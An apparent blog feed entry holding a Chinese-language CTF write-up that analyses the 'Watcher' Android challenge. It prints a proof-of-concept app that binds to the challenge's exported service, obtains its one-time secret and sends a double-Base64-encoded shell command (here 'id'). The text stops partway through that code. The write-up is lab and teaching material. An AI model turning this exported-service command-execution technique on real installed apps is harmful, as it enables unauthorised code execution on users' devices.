<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arch3rn4r</title>
  
  
  <link href="http://arch3rn4r.github.io/atom.xml" rel="self"/>
  
  <link href="http://arch3rn4r.github.io/"/>
  <updated>2025-05-06T06:49:18.529Z</updated>
  <id>http://arch3rn4r.github.io/</id>
  
  <author>
    <name>arch3rn4r</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BitSiegeCTF2025-Watcher</title>
    <link href="http://arch3rn4r.github.io/2025/05/06/BitSiegeCTF2025-Watcher/"/>
    <id>http://arch3rn4r.github.io/2025/05/06/BitSiegeCTF2025-Watcher/</id>
    <published>2025-05-06T06:28:47.000Z</published>
    <updated>2025-05-06T06:49:18.529Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前置分析"><a href="#前置分析" class="headerlink" title="前置分析"></a>前置分析</h2><p>题目描述<br>题目下载链接:<a class="link"   href="https://github.com/0xbinder/BitCTF-2025/blob/main/watcher.apk" >https://github.com/0xbinder/BitCTF-2025/blob/main/watcher.apk<i class="fas fa-external-link-alt"></i></a><br><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test1/Pasted%20image%2020250506084837.png"                                        ><br>打开modsf，获取到它的基本信息和暴露的组件<br><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test1/Pasted%20image%2020250506084328.png"                                        ></p><p>Package Name： com.example.watcher<br>exported services：com.example.watcher.WatcherService</p><p>查看WatcherService的代码，可以发现它里面有命令执行相关的代码，纳米就可以利用它这个暴露的WatcherService来尝试进行命令执行<br>题目要求说的是编写一个app来触发命令执行，接下来就是看具体的交互和代码编写</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>打开WatcherService.java,分析代码执行流程<br>主要处理这三个情况</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MSG_ECHO</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MSG_GET_SECRET</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MSG_RUN_COMMAND</span> <span class="operator">=</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>case3和命令执行相关，里面包含了一个一次性secret的检查，下面是secret相关代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WatcherService.<span class="built_in">this</span>.currentRequestedSecret = UUID.randomUUID().toString();</span><br><span class="line"><span class="type">String</span> <span class="variable">providedSecret</span> <span class="operator">=</span> message.getData().getString(<span class="string">&quot;secret&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (WatcherService.<span class="built_in">this</span>.currentRequestedSecret == <span class="literal">null</span> || !WatcherService.<span class="built_in">this</span>.currentRequestedSecret.equals(providedSecret)) </span><br></pre></td></tr></table></figure><p>如果成功的话，就会执行这个代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">commandOutput</span> <span class="operator">=</span> Handlers.executeCommand(command);</span><br></pre></td></tr></table></figure><p>那么现在点击Handlers来处理命令执行相关的代码<br>它这里有两个判断,如果sdk的版本大于26那么会对传入的数据进行两次base64解码，也就是说我们传入的初始字符要经过两次base64加密后再传入(我使用的sdk是29，所以我需要遵循两次加密)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">26</span>) &#123;</span><br><span class="line">            singleDecodedCommand = <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getDecoder().decode(doubleEncodedCommand));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">26</span>) &#123;</span><br><span class="line">            command = <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getDecoder().decode(singleDecodedCommand));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>解密没有问题后就会开始执行代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br></pre></td></tr></table></figure><p>为什么以API26为界限呢<br>因为java.util.Base64是在 Android API 级别 26 (Android 8.0 Oreo) 才被正式引入并保证可用的。API26之前是使用android.util.Base64。<br>在这题中没有处理API26之后的情况，如果是API26之后，解码步骤会被跳过，command会为null,程序无法执行</p><h2 id="编写poc"><a href="#编写poc" class="headerlink" title="编写poc"></a>编写poc</h2><p><a class="link"   href="https://developer.android.com/reference/android/os/IBinder" >IBinder<i class="fas fa-external-link-alt"></i></a> 是一个<strong>通信接口</strong>，定义了外部应用可以如何与该 Service 交互,onBind 返回了 messenger.getBinder()。外部应用拿到这个 IBinder 后，就可以创建一个 Messenger 对象，从而能够向 WatcherService 的 IncomingHandler 发送 Message。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.messenger.getBinder();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="连接service"><a href="#连接service" class="headerlink" title="连接service"></a>连接service</h3><p>进行连接<br><a class="link"   href="https://developer.android.com/develop/background-work/services/bound-services?hl=zh-cn#bind-started-service" >绑定到目标service<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onStart</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">    <span class="comment">//绑定目标app和目标服务</span></span><br><span class="line">    intent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(TARGET_PACKAGE, TARGET_SERVICE));  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        bindService(intent, mConnection, Context.BIND_AUTO_CREATE);</span><br><span class="line">        <span class="comment">//BIND_AUTO_CREATE:只要存在绑定，就自动创建服务。</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端通过调用 bindService() 绑定到服务。调用时，它必须提供 ServiceConnection 的实现，后者会监控与服务的连接。调用 bindService() 指示 请求的服务是否存在，以及是否允许客户端访问该服务。<br>时间 Android 系统会在客户端与服务之间创建连接， 致电 onServiceConnected() （在 ServiceConnection 上）。通过 onServiceConnected() 方法包含 IBinder 参数，客户端随后会使用该参数与绑定服务进行通信。</p><p><a class="link"   href="https://developer.android.com/reference/android/content/ServiceConnection" >处理连接<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ServiceConnection</span> <span class="variable">mConnection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServiceConnection</span>() &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> &#123;</span><br><span class="line">    <span class="comment">//name:服务已连接的组件的具体名称。</span></span><br><span class="line">    <span class="comment">//service:服务通信通道的 IBinder，您现在可以对其进行调用。</span></span><br><span class="line">    mServiceMessenger = <span class="keyword">new</span> <span class="title class_">Messenger</span>(service);</span><br><span class="line">    <span class="comment">//WatcherService 使用 Messenger 进行通信，并且它的 onBind 返回的是其内部 Messenger 的 Binder (messenger.getBinder())。所以，我们用 WatcherService 返回的这个 IBinder (service) 来创建一个新的 Messenger 对象 (mServiceMessenger)。这个 mServiceMessenger 现在就指向了 WatcherService 内部的 IncomingHandler，可以用来向 WatcherService发送消息了。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceDisconnected</span> <span class="params">(ComponentName name)</span>&#123;</span><br><span class="line"><span class="comment">//name:该服务的具体组件名称，其连接已丢失。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="处理一次性secret"><a href="#处理一次性secret" class="headerlink" title="处理一次性secret"></a>处理一次性secret</h3><p>请求secret</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Message</span> <span class="variable">getSecretMsg</span> <span class="operator">=</span> Message.obtain(<span class="literal">null</span>, MSG_GET_SECRET); </span><br><span class="line"><span class="comment">//Handler h:null:在创建要跨进程发送的消息时，源 Handler 通常设为 null。</span></span><br><span class="line"><span class="comment">//int what:MSG_GET_SECRET</span></span><br><span class="line">getSecretMsg.replyTo = mReplyMessenger;  </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">    mServiceMessenger.send(getSecretMsg);  </span><br><span class="line">    <span class="comment">//向WatcherService发送信息，最终WatcherService的 public void handleMessage(Message message)处理信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存储secret<br>mReplyMessenger用ReplyHandler处理回复的信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">reply</span> <span class="operator">=</span> msg.getData() != <span class="literal">null</span> ? msg.getData().getString(KEY_REPLY) : <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//匹配键值对（在watcherservice的sendReply设置）提取reply（回复的信息）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (msg.what) &#123;  </span><br><span class="line">    <span class="keyword">case</span> MSG_GET_SECRET:</span><br><span class="line">    mReceivedSecret = reply;</span><br><span class="line">    <span class="comment">//保存回复的信息（一次性secret)</span></span><br><span class="line">    sendCommand();</span><br><span class="line">    <span class="comment">//并且就在这里马上进行执行指令，因为这个口令是一次性的，每次请求都不一样</span></span><br></pre></td></tr></table></figure><h3 id="发送指令"><a href="#发送指令" class="headerlink" title="发送指令"></a>发送指令</h3><p>准备指令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;id&quot;</span>; <span class="comment">// The command to execute  </span></span><br><span class="line"><span class="type">String</span> <span class="variable">doubleEncodedCommand</span> <span class="operator">=</span> doubleEncodeBase64(command);</span><br><span class="line"><span class="comment">//进行两次base64加密，对应handler的两次base64解码</span></span><br><span class="line"></span><br><span class="line">bundle.putString(KEY_SECRET, mReceivedSecret);  </span><br><span class="line">bundle.putString(KEY_COMMAND, doubleEncodedCommand);</span><br><span class="line">runCmdMsg.setData(bundle);</span><br><span class="line"><span class="comment">//准备对象池，设立键值对，需要一次性secret和目标command</span></span><br></pre></td></tr></table></figure><p>进行指令的发送并处理消息回复</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">runCmdMsg.replyTo = mReplyMessenger;</span><br><span class="line">mServiceMessenger.send(runCmdMsg);</span><br></pre></td></tr></table></figure><h3 id="完整的MainActivity-java"><a href="#完整的MainActivity-java" class="headerlink" title="完整的MainActivity.java"></a>完整的MainActivity.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.watchpoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> android.content.ComponentName;  </span><br><span class="line"><span class="keyword">import</span> android.content.Context;  </span><br><span class="line"><span class="keyword">import</span> android.content.Intent;  </span><br><span class="line"><span class="keyword">import</span> android.content.ServiceConnection;  </span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;  </span><br><span class="line"><span class="keyword">import</span> android.os.Handler;  </span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;  </span><br><span class="line"><span class="keyword">import</span> android.os.Looper;  </span><br><span class="line"><span class="keyword">import</span> android.os.Message;  </span><br><span class="line"><span class="keyword">import</span> android.os.Messenger;  </span><br><span class="line"><span class="keyword">import</span> android.os.RemoteException;  </span><br><span class="line"><span class="keyword">import</span> android.util.Log;  </span><br><span class="line"><span class="keyword">import</span> android.widget.Button;  </span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;  </span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64; <span class="comment">// Requires API 26+  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;MinimalPOC&quot;</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TARGET_PACKAGE</span> <span class="operator">=</span> <span class="string">&quot;com.example.watcher&quot;</span>; <span class="comment">// Target App  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TARGET_SERVICE</span> <span class="operator">=</span> <span class="string">&quot;com.example.watcher.WatcherService&quot;</span>; <span class="comment">// Target Service  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Message codes from WatcherService    private static final int MSG_GET_SECRET = 2;  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MSG_RUN_COMMAND</span> <span class="operator">=</span> <span class="number">3</span>;  </span><br><span class="line">    <span class="comment">// Bundle keys from WatcherService  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_SECRET</span> <span class="operator">=</span> <span class="string">&quot;secret&quot;</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_COMMAND</span> <span class="operator">=</span> <span class="string">&quot;command&quot;</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_REPLY</span> <span class="operator">=</span> <span class="string">&quot;reply&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">Messenger</span> <span class="variable">mServiceMessenger</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// Sends messages to target service  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">mIsBound</span> <span class="operator">=</span> <span class="literal">false</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">mReceivedSecret</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Receives replies from target service  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Messenger</span> <span class="variable">mReplyMessenger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Messenger</span>(<span class="keyword">new</span> <span class="title class_">ReplyHandler</span>(Looper.getMainLooper()));  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> Button buttonRun;  </span><br><span class="line">    <span class="keyword">private</span> TextView textOutput;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Handles replies from WatcherService  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">ReplyHandler</span> <span class="keyword">extends</span> <span class="title class_">Handler</span> &#123;  </span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ReplyHandler</span><span class="params">(Looper looper)</span> &#123; <span class="built_in">super</span>(looper); &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleMessage</span><span class="params">(Message msg)</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">reply</span> <span class="operator">=</span> msg.getData() != <span class="literal">null</span> ? msg.getData().getString(KEY_REPLY) : <span class="literal">null</span>;  </span><br><span class="line">            Log.d(TAG, <span class="string">&quot;Reply received: what=&quot;</span> + msg.what + <span class="string">&quot;, reply=&quot;</span> + reply);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">switch</span> (msg.what) &#123;  </span><br><span class="line">                <span class="keyword">case</span> MSG_GET_SECRET:  </span><br><span class="line">                    <span class="keyword">if</span> (reply != <span class="literal">null</span> &amp;&amp; !reply.startsWith(<span class="string">&quot;Error&quot;</span>)) &#123;  </span><br><span class="line">                        mReceivedSecret = reply;  </span><br><span class="line">                        textOutput.append(<span class="string">&quot;\nSecret received: &quot;</span> + mReceivedSecret);  </span><br><span class="line">                        <span class="comment">// Now send the command  </span></span><br><span class="line">                        sendCommand();  </span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                        textOutput.append(<span class="string">&quot;\nError getting secret: &quot;</span> + reply);  </span><br><span class="line">                        Log.e(TAG, <span class="string">&quot;Failed to get secret: &quot;</span> + reply);  </span><br><span class="line">                        buttonRun.setEnabled(<span class="literal">true</span>); </span><br><span class="line">                    &#125;  </span><br><span class="line">                    <span class="keyword">break</span>;  </span><br><span class="line">                <span class="keyword">case</span> MSG_RUN_COMMAND:  </span><br><span class="line">                    textOutput.append(<span class="string">&quot;\nCommand Output:\n&quot;</span> + reply);  </span><br><span class="line">                    Log.i(TAG, <span class="string">&quot;Command output received.&quot;</span>);  </span><br><span class="line">                    buttonRun.setEnabled(<span class="literal">true</span>); </span><br><span class="line">                    <span class="keyword">break</span>;  </span><br><span class="line">                <span class="keyword">default</span>:  </span><br><span class="line">                    <span class="built_in">super</span>.handleMessage(msg);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Connects/disconnects from WatcherService  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ServiceConnection</span> <span class="variable">mConnection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServiceConnection</span>() &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> &#123;  </span><br><span class="line">            mServiceMessenger = <span class="keyword">new</span> <span class="title class_">Messenger</span>(service);  </span><br><span class="line">            mIsBound = <span class="literal">true</span>;  </span><br><span class="line">            buttonRun.setEnabled(<span class="literal">true</span>);  </span><br><span class="line">            textOutput.setText(<span class="string">&quot;Service Connected. Ready.&quot;</span>);  </span><br><span class="line">            Log.i(TAG, <span class="string">&quot;Watcher Service connected.&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceDisconnected</span><span class="params">(ComponentName name)</span> &#123;  </span><br><span class="line">            mServiceMessenger = <span class="literal">null</span>;  </span><br><span class="line">            mIsBound = <span class="literal">false</span>;  </span><br><span class="line">            buttonRun.setEnabled(<span class="literal">false</span>);  </span><br><span class="line">            textOutput.setText(<span class="string">&quot;Service Disconnected.&quot;</span>);  </span><br><span class="line">            Log.w(TAG, <span class="string">&quot;Watcher Service disconnected.&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;  </span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);  </span><br><span class="line">        setContentView(R.layout.activity_main);  </span><br><span class="line">  </span><br><span class="line">        buttonRun = findViewById(R.id.button_run);  </span><br><span class="line">        textOutput = findViewById(R.id.text_output);  </span><br><span class="line">  </span><br><span class="line">        buttonRun.setEnabled(<span class="literal">false</span>);  </span><br><span class="line">        buttonRun.setOnClickListener(v -&gt; startExploit());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onStart</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="built_in">super</span>.onStart();  </span><br><span class="line">        textOutput.setText(<span class="string">&quot;Binding to Watcher Service...&quot;</span>);  </span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">        intent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(TARGET_PACKAGE, TARGET_SERVICE));  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            bindService(intent, mConnection, Context.BIND_AUTO_CREATE);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            textOutput.setText(<span class="string">&quot;Error binding: &quot;</span> + e.getMessage() + <span class="string">&quot;\nIs Watcher installed?&quot;</span>);  </span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Error binding&quot;</span>, e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onStop</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="built_in">super</span>.onStop();  </span><br><span class="line">        <span class="keyword">if</span> (mIsBound) &#123;  </span><br><span class="line">            unbindService(mConnection);  </span><br><span class="line">            mIsBound = <span class="literal">false</span>;  </span><br><span class="line">            mServiceMessenger = <span class="literal">null</span>;  </span><br><span class="line">            buttonRun.setEnabled(<span class="literal">false</span>);  </span><br><span class="line">            Log.d(TAG, <span class="string">&quot;Unbound from service.&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// --- Exploit Steps ---  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">startExploit</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (!mIsBound) &#123;  </span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Service not bound&quot;</span>, 